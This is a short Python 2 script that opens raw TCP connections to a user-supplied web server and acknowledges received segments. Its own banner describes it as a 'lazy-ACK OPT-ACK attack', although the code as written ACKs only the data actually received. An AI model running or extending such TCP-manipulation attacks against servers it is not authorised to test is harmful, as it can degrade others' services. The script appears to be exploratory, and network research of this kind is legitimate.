import sys
import time
from raw_packet import Connection

if len(sys.argv) < 2:
    print "Usage : connect dest_ip "
    sys.exit()

print """We will try to establish a connection to a remote web server
and ACK all the packets that we receive. This will actually
implement the lazy-ACK OPT-ACK attack, but it shouldn't disrupt
any network, normally (I hope so at least)...

Let's go ! In detail, this script :
 - Opens a raw socket connected to sys.argv[1] on port 80
 - For ten times, does:
   - Establishes a TCP connection to the remote server
   - ACKs all the received segments
   - Closes the connection gracefully (FIN+ACK and RST)
"""

c = Connection(sys.argv[1], 80)

for _ in range(10):
    next_seq = c.initiate_connection()
    while True:
        (seq, length) = c.read_packet()
        # cont is True if we just ACKed a FIN packet on this connection
        cont = c.send_raw(seq_nbr = next_seq, ack_nbr=seq+length)
        if not cont:
            print "Over !"
            c.tear_down(next_seq)
            break